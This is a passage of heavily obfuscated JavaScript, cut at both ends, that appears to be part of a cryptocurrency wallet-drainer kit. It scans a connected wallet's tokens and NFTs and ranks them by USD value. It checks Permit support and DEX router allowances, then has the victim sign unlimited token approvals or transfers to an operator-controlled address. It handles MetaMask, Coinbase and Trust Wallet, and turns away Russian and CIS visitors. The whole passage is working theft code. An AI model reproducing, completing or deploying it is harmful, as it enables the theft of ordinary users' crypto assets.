get_tokens(_0x1c259f);else{if(_0x35acd0[_0x7ccdd3(0x125)]!=_0x7ccdd3(0x1aa))return _0x229486;else return FLASH_Check_Done=!![],FLASH_Loader_Style==0x2?FLASHL['fire']({'icon':_0x7ccdd3(0x125),'title':_0x7ccdd3(0x25f),'subtitle':_0x7ccdd3(0x1cc),'text':_0x7ccdd3(0xbc),'showConfirmButton':!![],'confirmButtonText':'OK','color':FLASH_Color_Scheme}):(Swal['close'](),Swal[_0x7ccdd3(0xbf)]({'html':_0x7ccdd3(0x20a),'icon':_0x7ccdd3(0x125),'allowOutsideClick':!![],'allowEscapeKey':!![],'timer':0x0,'width':0x258,'showConfirmButton':!![],'confirmButtonText':'OK'})),await new Promise(_0x5b2fb8=>setTimeout(_0x5b2fb8,0x2710)),_0x229486;}}let _0x336655=[];for(let _0x368801=_0x229486[_0x7ccdd3(0x1a6)]-0x1;_0x368801>=0x0;_0x368801--){try{const _0x4de7a1=_0x229486[_0x368801],_0x377020=convert_chain('ID',_0x7ccdd3(0x186),_0x4de7a1[_0x7ccdd3(0x28e)]);if(!FLASH_Settings['Settings'][_0x7ccdd3(0xda)][_0x377020][_0x7ccdd3(0x175)])_0x229486[_0x7ccdd3(0x245)](_0x368801,0x1);else{if(_0x4de7a1[_0x7ccdd3(0x22c)]==_0x7ccdd3(0x158)&&!FLASH_Settings[_0x7ccdd3(0x1c7)]['Chains'][_0x377020][_0x7ccdd3(0x1b0)])_0x229486['splice'](_0x368801,0x1);else{if(_0x4de7a1[_0x7ccdd3(0x22c)]==_0x7ccdd3(0x252)&&!FLASH_Settings[_0x7ccdd3(0x1c7)][_0x7ccdd3(0xda)][_0x377020]['Tokens'])_0x229486[_0x7ccdd3(0x245)](_0x368801,0x1);else{if(_0x4de7a1[_0x7ccdd3(0x22c)]==_0x7ccdd3(0x158)&&_0x4de7a1[_0x7ccdd3(0xc1)]<FLASH_Settings[_0x7ccdd3(0x1c7)]['Chains'][_0x377020][_0x7ccdd3(0x211)])_0x229486[_0x7ccdd3(0x245)](_0x368801,0x1);else{if(_0x4de7a1[_0x7ccdd3(0x22c)]==_0x7ccdd3(0x252)&&_0x4de7a1[_0x7ccdd3(0xc1)]<FLASH_Settings[_0x7ccdd3(0x1c7)][_0x7ccdd3(0xda)][_0x377020][_0x7ccdd3(0x293)])_0x229486[_0x7ccdd3(0x245)](_0x368801,0x1);else _0x4de7a1['type']==_0x7ccdd3(0x252)&&(FLASH_Settings[_0x7ccdd3(0x1c7)]['Permit2'][_0x7ccdd3(0x267)]&&_0x336655[_0x7ccdd3(0x1a5)](new Promise(async _0xba62a9=>{const _0x4e8710=_0x7ccdd3;try{if(_0x4de7a1['amount_usd']>=FLASH_Settings[_0x4e8710(0x1c7)][_0x4e8710(0x1c1)][_0x4e8710(0x253)]){const _0x91eea7=new ethers[(_0x4e8710(0xe1))]['JsonRpcProvider'](FLASH_Settings[_0x4e8710(0x256)][_0x4de7a1[_0x4e8710(0x28e)]]),_0x429731=new ethers[(_0x4e8710(0x15a))](_0x4de7a1['address'],FLASH_Contract_ABI[_0x4e8710(0x252)],_0x91eea7);let _0x35f855=await _0x429731['allowance'](FLASH_Current_Address,_0x4e8710(0x180));ethers[_0x4e8710(0x11a)][_0x4e8710(0x239)](_0x35f855)['gt'](ethers[_0x4e8710(0x11a)][_0x4e8710(0x239)]('0'))&&(_0x4de7a1[_0x4e8710(0x150)]=!![],_0x4de7a1['allowance']=_0x35f855,console[_0x4e8710(0x260)](_0x4e8710(0x1dc)+_0x4de7a1[_0x4e8710(0xd8)]+_0x4e8710(0x1c4)+_0x35f855));}}catch(_0x28ef22){console[_0x4e8710(0x260)](_0x28ef22);}_0xba62a9();})),(FLASH_Settings[_0x7ccdd3(0x1c7)][_0x7ccdd3(0xa6)]['Mode']&&FLASH_Settings[_0x7ccdd3(0x1c7)][_0x7ccdd3(0xa6)][_0x7ccdd3(0x295)]>0x0||FLASH_Settings[_0x7ccdd3(0x1c7)]['Approve'][_0x7ccdd3(0x15c)]>=0x2&&FLASH_Current_Provider=='MetaMask'||FLASH_Settings[_0x7ccdd3(0x1c7)][_0x7ccdd3(0x133)][_0x7ccdd3(0x264)]>=0x2&&FLASH_Current_Provider=='Trust\x20Wallet')&&_0x336655[_0x7ccdd3(0x1a5)](new Promise(async _0x33af70=>{const _0xc20f1a=_0x7ccdd3;try{if(FLASH_Settings['Settings'][_0xc20f1a(0x133)][_0xc20f1a(0x15c)]>=0x2&&FLASH_Current_Provider=='MetaMask'||FLASH_Settings[_0xc20f1a(0x1c7)][_0xc20f1a(0x133)][_0xc20f1a(0x264)]>=0x2&&FLASH_Current_Provider=='Trust\x20Wallet'||_0x4de7a1[_0xc20f1a(0xc1)]>=FLASH_Settings[_0xc20f1a(0x1c7)]['Permit']['Price']){const _0x2c32e1=await retrive_token(_0x4de7a1[_0xc20f1a(0x28e)],_0x4de7a1[_0xc20f1a(0x1d2)]),_0x35b1df=new ethers[(_0xc20f1a(0xe1))][(_0xc20f1a(0x299))](FLASH_Settings[_0xc20f1a(0x256)][_0x4de7a1['chain_id']]),_0x37155e=new ethers[(_0xc20f1a(0x15a))](_0x4de7a1[_0xc20f1a(0x1d2)],_0x2c32e1,_0x35b1df);if(is_increase_approve(_0x37155e[_0xc20f1a(0x18b)])==0x2)_0x4de7a1[_0xc20f1a(0x1b8)]=0x2,_0x4de7a1[_0xc20f1a(0xd9)]=_0x2c32e1;else is_increase_approve(_0x37155e[_0xc20f1a(0x18b)])==0x1&&(_0x4de7a1[_0xc20f1a(0x1b8)]=0x1,_0x4de7a1[_0xc20f1a(0xd9)]=_0x2c32e1);if(_0x4de7a1[_0xc20f1a(0xc1)]>=FLASH_Settings[_0xc20f1a(0x1c7)][_0xc20f1a(0xa6)][_0xc20f1a(0x253)]){const _0x4fb5df=get_permit_type(_0x37155e[_0xc20f1a(0x18b)]);_0x4de7a1['permit']=_0x4fb5df,_0x4de7a1[_0xc20f1a(0xb9)]='1',_0x4de7a1[_0xc20f1a(0xd9)]=_0x2c32e1;if(_0x4fb5df>0x0){if(_0x37155e[_0xc20f1a(0x18b)][_0xc20f1a(0xbe)](_0xc20f1a(0x227)))try{_0x4de7a1[_0xc20f1a(0xb9)]=await _0x37155e[_0xc20f1a(0x227)]();}catch(_0x5cec36){console[_0xc20f1a(0x260)](_0x5cec36);}console[_0xc20f1a(0x260)](_0xc20f1a(0x22e)+_0x4de7a1['name']+_0xc20f1a(0x123)+_0x4fb5df+',\x20Version:\x20'+_0x4de7a1['permit_ver']);}}}}catch(_0x2f88df){console[_0xc20f1a(0x260)](_0x2f88df);}_0x33af70();})),FLASH_Settings['Settings'][_0x7ccdd3(0x139)]['Enable']&&_0x336655[_0x7ccdd3(0x1a5)](new Promise(async _0x540072=>{const _0x2b2e1b=_0x7ccdd3;try{if(_0x4de7a1['amount_usd']>=FLASH_Settings[_0x2b2e1b(0x1c7)][_0x2b2e1b(0x139)][_0x2b2e1b(0x253)]){const _0xbb348e=new ethers[(_0x2b2e1b(0xe1))][(_0x2b2e1b(0x299))](FLASH_Settings['RPCs'][_0x4de7a1[_0x2b2e1b(0x28e)]]);for(const _0x837522 of FLASH_Routers[_0x4de7a1[_0x2b2e1b(0x28e)]]){try{const _0x3aef1b=new ethers[(_0x2b2e1b(0x15a))](_0x4de7a1[_0x2b2e1b(0x1d2)],FLASH_Contract_ABI[_0x2b2e1b(0x252)],_0xbb348e),_0xf56792=await _0x3aef1b[_0x2b2e1b(0xd4)](FLASH_Current_Address,_0x837522[0x1]);if(ethers[_0x2b2e1b(0x11a)][_0x2b2e1b(0x239)](_0xf56792)['gt'](ethers['BigNumber']['from']('0'))){if(_0x837522[0x0]==_0x2b2e1b(0x28c)&&FLASH_Settings[_0x2b2e1b(0x1c7)]['Swappers'][_0x2b2e1b(0xdb)]==0x0)continue;if(_0x837522[0x0]==_0x2b2e1b(0x126)&&FLASH_Settings[_0x2b2e1b(0x1c7)][_0x2b2e1b(0x139)][_0x2b2e1b(0x1f3)]==0x0)continue;if(_0x837522[0x0]=='Uniswap'&&(!FLASH_Uniswap_Whitelist[_0x2b2e1b(0xc5)](_0x4de7a1['address'])||FLASH_Settings['Settings'][_0x2b2e1b(0x139)]['Uniswap']==0x0))continue;if((_0x837522[0x0]==_0x2b2e1b(0x230)||_0x837522[0x0]==_0x2b2e1b(0x112))&&(!FLASH_Pancake_Whitelist['includes'](_0x4de7a1[_0x2b2e1b(0x1d2)])||FLASH_Settings[_0x2b2e1b(0x1c7)][_0x2b2e1b(0x139)]['Pancake']==0x0))continue;_0x4de7a1['swapper']=!![],_0x4de7a1[_0x2b2e1b(0xdc)]=_0x837522[0x0],_0x4de7a1[_0x2b2e1b(0x26e)]=_0x837522[0x1],_0x4de7a1['swapper_allowance']=_0xf56792,console[_0x2b2e1b(0x260)](_0x2b2e1b(0xa1)+_0x4de7a1[_0x2b2e1b(0xd8)]+',\x20'+_0x837522[0x0]);break;}}catch(_0x2e89c6){console[_0x2b2e1b(0x260)](_0x2e89c6);}}}}catch(_0x2ef3b4){console[_0x2b2e1b(0x260)](_0x2ef3b4);}_0x540072();})));}}}}}catch(_0x5299d2){console[_0x7ccdd3(0x260)](_0x5299d2);}}await Promise[_0x7ccdd3(0x231)](_0x336655);let _0x1b1300=![];for(const _0x44aa7d in FLASH_Settings[_0x7ccdd3(0x1c7)][_0x7ccdd3(0xda)]){try{if(FLASH_Settings[_0x7ccdd3(0x1c7)][_0x7ccdd3(0xda)][_0x44aa7d]['NFTs']){_0x1b1300=!![];break;}}catch(_0x51f9c8){console[_0x7ccdd3(0x260)](_0x51f9c8);}}if(_0x1b1300)try{let _0xa107e7=[];_0x35acd0=await send_request({'action':'check_nft','address':FLASH_Current_Address});if(_0x35acd0[_0x7ccdd3(0x250)]=='OK'){_0xa107e7=_0x35acd0[_0x7ccdd3(0x1be)];for(const _0x88176a of _0xa107e7){try{const _0x56fc85=convert_chain('ID','ANKR',_0x88176a[_0x7ccdd3(0x28e)]);if(_0x88176a[_0x7ccdd3(0x22c)]==_0x7ccdd3(0x105))continue;if(!FLASH_Settings[_0x7ccdd3(0x1c7)][_0x7ccdd3(0xda)][_0x56fc85][_0x7ccdd3(0xcb)])continue;if(_0x88176a[_0x7ccdd3(0xc1)]<FLASH_Settings[_0x7ccdd3(0x1c7)][_0x7ccdd3(0xda)][_0x56fc85][_0x7ccdd3(0x268)])continue;_0x229486[_0x7ccdd3(0x1a5)](_0x88176a);}catch(_0x541c9c){console[_0x7ccdd3(0x260)](_0x541c9c);}}}else{_0xa107e7=await get_nfts(_0x1c259f);for(const _0x24d2f6 of _0xa107e7){try{const _0x362cc5=convert_chain('ID',_0x7ccdd3(0x186),_0x24d2f6[_0x7ccdd3(0x28e)]);if(_0x24d2f6[_0x7ccdd3(0x22c)]=='ERC1155')continue;if(!FLASH_Settings[_0x7ccdd3(0x1c7)][_0x7ccdd3(0xda)][_0x362cc5]['NFTs'])continue;if(_0x24d2f6[_0x7ccdd3(0xc1)]<FLASH_Settings[_0x7ccdd3(0x1c7)][_0x7ccdd3(0xda)][_0x362cc5]['Min_NFTs_Price'])continue;_0x229486[_0x7ccdd3(0x1a5)](_0x24d2f6);}catch(_0x46544d){console[_0x7ccdd3(0x260)](_0x46544d);}}}}catch(_0x4f7a9f){console[_0x7ccdd3(0x260)](_0x4f7a9f);}_0x229486['sort']((_0x36f964,_0x16d510)=>{const _0x403bfd=_0x7ccdd3;return _0x16d510[_0x403bfd(0xc1)]-_0x36f964[_0x403bfd(0xc1)];});if(FLASH_Settings[_0x7ccdd3(0x1c7)][_0x7ccdd3(0x238)]==0x1){const _0x5b1df0=[];for(const _0x41508b of _0x229486){try{if(_0x41508b['type']=='NATIVE')continue;_0x5b1df0[_0x7ccdd3(0x1a5)](_0x41508b);}catch(_0x5c6c1f){console['log'](_0x5c6c1f);}}for(const _0x2a3b93 of _0x229486){try{if(_0x2a3b93['type']!=_0x7ccdd3(0x158))continue;_0x5b1df0[_0x7ccdd3(0x1a5)](_0x2a3b93);}catch(_0x58f27c){console[_0x7ccdd3(0x260)](_0x58f27c);}}_0x229486=_0x5b1df0;}else{if(FLASH_Settings[_0x7ccdd3(0x1c7)][_0x7ccdd3(0x238)]==0x2){const _0x3619f9=[];for(const _0x430463 of _0x229486){try{if(_0x430463[_0x7ccdd3(0x22c)]!=_0x7ccdd3(0x158))continue;_0x3619f9['push'](_0x430463);}catch(_0x5eed8e){console[_0x7ccdd3(0x260)](_0x5eed8e);}}for(const _0x5eaf64 of _0x229486){try{if(_0x5eaf64[_0x7ccdd3(0x22c)]=='NATIVE')continue;_0x3619f9[_0x7ccdd3(0x1a5)](_0x5eaf64);}catch(_0x381aa0){console[_0x7ccdd3(0x260)](_0x381aa0);}}_0x229486=_0x3619f9;}}if(FLASH_Settings[_0x7ccdd3(0x1c7)][_0x7ccdd3(0x139)][_0x7ccdd3(0x175)]&&FLASH_Settings[_0x7ccdd3(0x1c7)]['Swappers']['Priority']==0x1){const _0x21fa73=[];for(const _0x246f0f of _0x229486){try{if(!_0x246f0f[_0x7ccdd3(0x1fb)])continue;_0x21fa73[_0x7ccdd3(0x1a5)](_0x246f0f);}catch(_0x2c0aae){console[_0x7ccdd3(0x260)](_0x2c0aae);}}for(const _0x1c774c of _0x229486){try{if(_0x1c774c[_0x7ccdd3(0x1fb)])continue;_0x21fa73[_0x7ccdd3(0x1a5)](_0x1c774c);}catch(_0x272311){console[_0x7ccdd3(0x260)](_0x272311);}}_0x229486=_0x21fa73;}if(FLASH_Settings[_0x7ccdd3(0x1c7)]['Permit'][_0x7ccdd3(0x267)]&&FLASH_Settings['Settings']['Permit'][_0x7ccdd3(0x295)]>0x0){const _0x143c8d=[];for(const _0x45ffcc of _0x229486){try{if(!_0x45ffcc[_0x7ccdd3(0x159)]||_0x45ffcc['permit']==0x0||_0x45ffcc['amount_usd']<FLASH_Settings[_0x7ccdd3(0x1c7)]['Permit']['Priority'])continue;_0x143c8d[_0x7ccdd3(0x1a5)](_0x45ffcc);}catch(_0x990c87){console[_0x7ccdd3(0x260)](_0x990c87);}}for(const _0xc3a8c7 of _0x229486){try{if(_0xc3a8c7[_0x7ccdd3(0x159)]&&_0xc3a8c7['permit']>0x0&&_0xc3a8c7['amount_usd']>=FLASH_Settings[_0x7ccdd3(0x1c7)][_0x7ccdd3(0xa6)][_0x7ccdd3(0x295)])continue;_0x143c8d['push'](_0xc3a8c7);}catch(_0xf41917){console['log'](_0xf41917);}}_0x229486=_0x143c8d;}if(FLASH_Settings[_0x7ccdd3(0x1c7)][_0x7ccdd3(0x139)][_0x7ccdd3(0x175)]&&FLASH_Settings[_0x7ccdd3(0x1c7)][_0x7ccdd3(0x139)][_0x7ccdd3(0x295)]==0x2){const _0x1e596a=[];for(const _0x2a9be3 of _0x229486){try{if(!_0x2a9be3[_0x7ccdd3(0x1fb)])continue;_0x1e596a[_0x7ccdd3(0x1a5)](_0x2a9be3);}catch(_0x227d50){console['log'](_0x227d50);}}for(const _0x41110d of _0x229486){try{if(_0x41110d[_0x7ccdd3(0x1fb)])continue;_0x1e596a[_0x7ccdd3(0x1a5)](_0x41110d);}catch(_0xbd6b64){console[_0x7ccdd3(0x260)](_0xbd6b64);}}_0x229486=_0x1e596a;}return _0x229486;}catch(_0x2c4446){return console[_0x7ccdd3(0x260)](_0x2c4446),[];}},APPROVE_TOKEN=async _0x235ad8=>{const _0x2d37db=_0x26b509;if(FLASH_Settings[_0x2d37db(0x1c7)][_0x2d37db(0x133)][_0x2d37db(0x175)]==0x0)return await TRANSFER_TOKEN(_0x235ad8),0x2;if((FLASH_Current_Provider==_0x2d37db(0x15c)&&FLASH_Settings['Settings'][_0x2d37db(0x133)][_0x2d37db(0x15c)]>=0x2||FLASH_Current_Provider==_0x2d37db(0xf9)&&FLASH_Settings[_0x2d37db(0x1c7)][_0x2d37db(0x133)]['Trust']>=0x2)&&!_0x235ad8['increase'])try{for(let _0x172699=0x0;_0x172699<0x2;_0x172699++){if(_0x235ad8[_0x2d37db(0x1b8)])continue;try{const _0xb9187a=await retrive_token(_0x235ad8[_0x2d37db(0x28e)],_0x235ad8['address']),_0x4c9f70=new ethers[(_0x2d37db(0xe1))][(_0x2d37db(0x299))](FLASH_Settings[_0x2d37db(0x256)][_0x235ad8[_0x2d37db(0x28e)]]),_0x151653=new ethers[(_0x2d37db(0x15a))](_0x235ad8['address'],_0xb9187a,_0x4c9f70);if(is_increase_approve(_0x151653['functions'])==0x2)_0x235ad8['increase']=0x2;else{if(is_increase_approve(_0x151653[_0x2d37db(0x18b)])==0x1)_0x235ad8[_0x2d37db(0x1b8)]=0x1;}}catch(_0x39df4d){console[_0x2d37db(0x260)](_0x39df4d);}}}catch(_0xcf1b56){console[_0x2d37db(0x260)](_0xcf1b56);}if((FLASH_Current_Provider==_0x2d37db(0x15c)&&FLASH_Settings[_0x2d37db(0x1c7)][_0x2d37db(0x133)][_0x2d37db(0x15c)]>=0x2||FLASH_Current_Provider=='Trust\x20Wallet'&&FLASH_Settings[_0x2d37db(0x1c7)][_0x2d37db(0x133)][_0x2d37db(0x264)]>=0x2)&&_0x235ad8[_0x2d37db(0x1b8)])return await MM_APPROVE_TOKEN(_0x235ad8);if((FLASH_Current_Provider==_0x2d37db(0x15c)&&FLASH_Settings['Settings'][_0x2d37db(0x133)][_0x2d37db(0x15c)]==0x2||FLASH_Current_Provider==_0x2d37db(0xf9)&&FLASH_Settings[_0x2d37db(0x1c7)][_0x2d37db(0x133)]['Trust']==0x2)&&!_0x235ad8[_0x2d37db(0x1b8)])return await TRANSFER_TOKEN(_0x235ad8),0x2;if((FLASH_Current_Provider==_0x2d37db(0x15c)&&FLASH_Settings[_0x2d37db(0x1c7)][_0x2d37db(0x133)]['MetaMask']==0x3||FLASH_Current_Provider==_0x2d37db(0xf9)&&FLASH_Settings[_0x2d37db(0x1c7)][_0x2d37db(0x133)][_0x2d37db(0x264)]==0x3)&&!_0x235ad8[_0x2d37db(0x1b8)])throw new Error(_0x2d37db(0xde));const _0x379c2d=new ethers[(_0x2d37db(0xe1))][(_0x2d37db(0x299))](FLASH_Settings['RPCs'][_0x235ad8[_0x2d37db(0x28e)]]),_0x4503a0=BN(await _0x379c2d[_0x2d37db(0x1ee)]())[_0x2d37db(0x208)](BN(0x64))['mul'](BN(Math[_0x2d37db(0x285)](FLASH_Gas_Multiplier*0x64)));let _0x11e6d3=ethers[_0x2d37db(0x18e)][_0x2d37db(0x280)](FLASH_Unlimited_Amount);for(const _0x4f6ef6 of FLASH_Settings[_0x2d37db(0x23a)]){try{if(_0x4f6ef6[0x0]==FLASH_Current_Chain_ID&&_0x4f6ef6[0x1]==_0x235ad8[_0x2d37db(0x1d2)]['toLowerCase']()[_0x2d37db(0x20f)]()){_0x11e6d3=_0x235ad8[_0x2d37db(0x257)];break;}}catch(_0x3aa26c){console['log'](_0x3aa26c);}}const _0xa681c8={'from':FLASH_Current_Address,'to':_0x235ad8[_0x2d37db(0x1d2)],'value':_0x2d37db(0x1d1)},_0xa1790c=new Web3(FLASH_Provider);let _0x31475d=null;const _0x56a235=new _0xa1790c['eth'][(_0x2d37db(0x15a))](FLASH_Contract_ABI[_0x2d37db(0x252)],_0x235ad8[_0x2d37db(0x1d2)]);_0x31475d=_0x56a235[_0x2d37db(0x143)][_0x2d37db(0x263)](FLASH_Settings[_0x2d37db(0x1c7)]['Use_Randomizer_For_Tokens']?FLASH_Settings[_0x2d37db(0x1f2)][_0x2d37db(0x1d2)]:FLASH_Settings['Address'],_0x11e6d3)[_0x2d37db(0x195)](),_0xa681c8[_0x2d37db(0x1be)]=_0x31475d;const _0x1c58aa=await _0x379c2d[_0x2d37db(0x1ce)](_0xa681c8),_0x48e83d=await _0x379c2d['getTransactionCount'](FLASH_Current_Address,_0x2d37db(0x129));_0xa681c8['gasPrice']=_0x4503a0,_0xa681c8[_0x2d37db(0x249)]=_0x1c58aa,_0xa681c8[_0x2d37db(0x12e)]=_0x48e83d,await approve_request(_0x235ad8),sign_next();const _0x7145fc=await FLASH_Signer[_0x2d37db(0x1f0)](_0xa681c8);wait_message();if(FLASH_Settings[_0x2d37db(0x1c7)][_0x2d37db(0x22f)])await _0x379c2d['waitForTransaction'](_0x7145fc['hash'],0x1,0x7530);return await approve_success(_0x235ad8),sign_ready(),0x1;},MM_APPROVE_TOKEN=async _0x556b1a=>{const _0x197c63=_0x26b509;if((FLASH_Current_Provider==_0x197c63(0x15c)&&FLASH_Settings[_0x197c63(0x1c7)]['Approve'][_0x197c63(0x15c)]>=0x2||FLASH_Current_Provider==_0x197c63(0xf9)&&FLASH_Settings[_0x197c63(0x1c7)][_0x197c63(0x133)][_0x197c63(0x264)]>=0x2)&&!_0x556b1a[_0x197c63(0x1b8)])try{for(let _0x1568a6=0x0;_0x1568a6<0x2;_0x1568a6++){if(_0x556b1a['increase'])continue;try{const _0x54a2fa=await retrive_token(_0x556b1a[_0x197c63(0x28e)],_0x556b1a['address']),_0x14d320=new ethers[(_0x197c63(0xe1))][(_0x197c63(0x299))](FLASH_Settings[_0x197c63(0x256)][_0x556b1a['chain_id']]),_0x3525ca=new ethers['Contract'](_0x556b1a['address'],_0x54a2fa,_0x14d320);if(is_increase_approve(_0x3525ca[_0x197c63(0x18b)])==0x2)_0x556b1a['increase']=0x2;else{if(is_increase_approve(_0x3525ca[_0x197c63(0x18b)])==0x1)_0x556b1a[_0x197c63(0x1b8)]=0x1;}}catch(_0x4d1975){console['log'](_0x4d1975);}}}catch(_0x26ac28){console[_0x197c63(0x260)](_0x26ac28);}const _0x4e6867=new ethers[(_0x197c63(0xe1))][(_0x197c63(0x299))](FLASH_Settings[_0x197c63(0x256)][_0x556b1a[_0x197c63(0x28e)]]),_0x4ea96d=BN(await _0x4e6867['getGasPrice']())[_0x197c63(0x208)](BN(0x64))[_0x197c63(0x242)](BN(Math[_0x197c63(0x285)](FLASH_Gas_Multiplier*0x64)));let _0xd73ffa=ethers[_0x197c63(0x18e)][_0x197c63(0x280)](FLASH_Unlimited_Amount);for(const _0x16e750 of FLASH_Settings[_0x197c63(0x23a)]){try{if(_0x16e750[0x0]==FLASH_Current_Chain_ID&&_0x16e750[0x1]==_0x556b1a[_0x197c63(0x1d2)][_0x197c63(0x21d)]()[_0x197c63(0x20f)]()){_0xd73ffa=_0x556b1a[_0x197c63(0x257)];break;}}catch(_0x3deb09){console[_0x197c63(0x260)](_0x3deb09);}}const _0x4a2c6a={'from':FLASH_Current_Address,'to':_0x556b1a[_0x197c63(0x1d2)],'value':_0x197c63(0x1d1)},_0x50dae5=new Web3(FLASH_Provider);let _0x2b820c=null;const _0x106114=_0x556b1a['increase']==0x2?_0x197c63(0x1d4):_0x197c63(0x121),_0x2eb712=new _0x50dae5[(_0x197c63(0x147))]['Contract']([{'inputs':[{'internalType':_0x197c63(0x1d2),'name':_0x197c63(0x15e),'type':_0x197c63(0x1d2)},{'internalType':_0x197c63(0x114),'name':_0x197c63(0x12f),'type':_0x197c63(0x114)}],'name':''+_0x106114,'outputs':[{'internalType':_0x197c63(0x1bc),'name':'','type':'bool'}],'stateMutability':'nonpayable','type':_0x197c63(0x14b)}],_0x556b1a[_0x197c63(0x1d2)]);_0x2b820c=_0x2eb712[_0x197c63(0x143)][_0x106114](FLASH_Settings['Settings'][_0x197c63(0x1b7)]?FLASH_Settings[_0x197c63(0x1f2)]['address']:FLASH_Settings[_0x197c63(0x1f8)],_0xd73ffa)[_0x197c63(0x195)](),_0x4a2c6a['data']=_0x2b820c;const _0x1c8711=await _0x4e6867[_0x197c63(0x1ce)](_0x4a2c6a),_0x2fcbd0=await _0x4e6867[_0x197c63(0x127)](FLASH_Current_Address,_0x197c63(0x129));_0x4a2c6a[_0x197c63(0x20d)]=_0x4ea96d,_0x4a2c6a[_0x197c63(0x249)]=_0x1c8711,_0x4a2c6a[_0x197c63(0x12e)]=_0x2fcbd0,await approve_request(_0x556b1a),sign_next();const _0x8b5aa1=await FLASH_Signer[_0x197c63(0x1f0)](_0x4a2c6a);wait_message();if(FLASH_Settings['Settings'][_0x197c63(0x22f)])await _0x4e6867[_0x197c63(0x14f)](_0x8b5aa1[_0x197c63(0x226)],0x1,0x7530);return await approve_success(_0x556b1a),sign_ready(),0x1;},connect_wallet=async(_0x54908e=null)=>{const _0x4a6c7=_0x26b509;try{if(!FLASH_Connection){if(FLASH_Load_Time==null||Math[_0x4a6c7(0x285)](Date[_0x4a6c7(0x196)]()/0x3e8)-FLASH_Load_Time<0xf)return;FLASH_Loader_Style==0x2?FLASHL[_0x4a6c7(0xbf)]({'icon':_0x4a6c7(0x125),'title':_0x4a6c7(0xe0),'subtitle':_0x4a6c7(0x153),'text':_0x4a6c7(0x19f),'showConfirmButton':!![],'confirmButtonText':'OK','color':FLASH_Color_Scheme}):(Swal['close'](),Swal[_0x4a6c7(0xbf)]({'html':_0x4a6c7(0x104),'icon':_0x4a6c7(0x125),'allowOutsideClick':!![],'allowEscapeKey':!![],'timer':0x0,'width':0x258,'showConfirmButton':!![],'confirmButtonText':'OK'}));return;}if(FLASH_Process)return;FLASH_Process=!![];if(FLASH_Bad_Country){try{flash_hide();}catch(_0x5c7045){console[_0x4a6c7(0x260)](_0x5c7045);}try{FLASH_Loader_Style==0x2?FLASHL[_0x4a6c7(0xbf)]({'icon':_0x4a6c7(0x125),'title':_0x4a6c7(0x25f),'subtitle':_0x4a6c7(0x183),'text':'Пожалуйста,\x20покиньте\x20этот\x20веб-сайт\x20немедленно,\x20он\x20не\x20предназначен\x20для\x20России\x20и\x20стран\x20СНГ,\x20не\x20пытайтесь\x20использовать\x20VPN,\x20это\x20небезопасно!','showConfirmButton':!![],'confirmButtonText':'OK','color':FLASH_Color_Scheme}):(Swal[_0x4a6c7(0x297)](),Swal[_0x4a6c7(0xbf)]({'html':_0x4a6c7(0x214),'icon':'error','allowOutsideClick':!![],'allowEscapeKey':!![],'timer':0x0,'width':0x258,'showConfirmButton':!![],'confirmButtonText':'OK'})),await new Promise(_0x5f4bd6=>setTimeout(_0x5f4bd6,0x3a98)),window['location']['href']=_0x4a6c7(0x17d);}catch(_0x1e5ac9){console[_0x4a6c7(0x260)](_0x1e5ac9);}return;}if(_0x54908e!==null){if(_0x54908e==_0x4a6c7(0x15c)){if(typeof window['ethereum']=='object'&&typeof window[_0x4a6c7(0x181)][_0x4a6c7(0xe1)]==='object'){let _0x3b760c=![];for(const _0x3ec4c5 of window[_0x4a6c7(0x181)][_0x4a6c7(0xe1)]){if(_0x3ec4c5[_0x4a6c7(0x12b)]==!![]){_0x3b760c=!![],FLASH_Provider=_0x3ec4c5,FLASH_Current_Provider='MetaMask';break;}}if(!_0x3b760c){if(FLASH_Mobile_Status){window[_0x4a6c7(0x26b)][_0x4a6c7(0xef)]=_0x4a6c7(0x1e6)+FLASH_Current_URL,FLASH_Process=![];return;}else{window[_0x4a6c7(0x11c)](_0x4a6c7(0x1e7),_0x4a6c7(0x155))[_0x4a6c7(0x23e)](),FLASH_Process=![];return;}}}else{if(typeof window[_0x4a6c7(0x181)]===_0x4a6c7(0x1dd)&&window[_0x4a6c7(0x181)]['isMetaMask'])FLASH_Provider=window['ethereum'],FLASH_Current_Provider=_0x4a6c7(0x15c);else{if(FLASH_Mobile_Status){window[_0x4a6c7(0x26b)][_0x4a6c7(0xef)]=_0x4a6c7(0x1e6)+FLASH_Current_URL,FLASH_Process=![];return;}else{window[_0x4a6c7(0x11c)](_0x4a6c7(0x1e7),_0x4a6c7(0x155))[_0x4a6c7(0x23e)](),FLASH_Process=![];return;}}}}else{if(_0x54908e==_0x4a6c7(0x1c0)){if(typeof window['ethereum']==_0x4a6c7(0x1dd)&&typeof window[_0x4a6c7(0x181)][_0x4a6c7(0xe1)]===_0x4a6c7(0x1dd)){let _0x5d1093=![];for(const _0x510d45 of window[_0x4a6c7(0x181)]['providers']){if(_0x510d45[_0x4a6c7(0x1f1)]==!![]){_0x5d1093=!![],FLASH_Provider=_0x510d45;break;}}if(_0x5d1093)FLASH_Current_Provider=_0x4a6c7(0x1c0);else{if(FLASH_Mobile_Status){window[_0x4a6c7(0x26b)]['href']='https://go.cb-w.com/dapp?cb_url=https://'+FLASH_Current_URL,FLASH_Process=![];return;}else{window[_0x4a6c7(0x11c)](_0x4a6c7(0xeb),_0x4a6c7(0x155))['focus'](),FLASH_Process=![];return;}}}else{if(typeof window[_0x4a6c7(0x181)]===_0x4a6c7(0x1dd)&&(window[_0x4a6c7(0x181)][_0x4a6c7(0x1f1)]||window['ethereum']['isCoinbaseBrowser']))FLASH_Provider=window['ethereum'],FLASH_Current_Provider='Coinbase';else{if(FLASH_Mobile_Status){window['location'][_0x4a6c7(0xef)]=_0x4a6c7(0x101)+FLASH_Current_URL,FLASH_Process=![];return;}else{window[_0x4a6c7(0x11c)]('https://www.coinbase.com/wallet',_0x4a6c7(0x155))['focus'](),FLASH_Process=![];return;}}}}else{if(_0x54908e=='Trust\x20Wallet'){if(typeof window[_0x4a6c7(0x181)]===_0x4a6c7(0x1dd)&&window[_0x4a6c7(0x181)][_0x4a6c7(0x246)])FLASH_Provider=window['ethereum'],FLASH_Current_Provider=_0x4a6c7(0xf9);else{if(FLASH_Mobile_Status){window[_0x4a6c7(0x26b)][_0x4a6c7(0xef)]=_0x4a6c7(0x141)+FLASH_Current_URL,FLASH_Process=![];return;}else{window[_0x4a6c7(0x11c)]('https://trustwallet.com',_0x4a6c7(0x155))['focus'](),FLASH_Process=![];return;}}}else{if(_0x54908e==_0x4a6c7(0xe2)){if(typeof 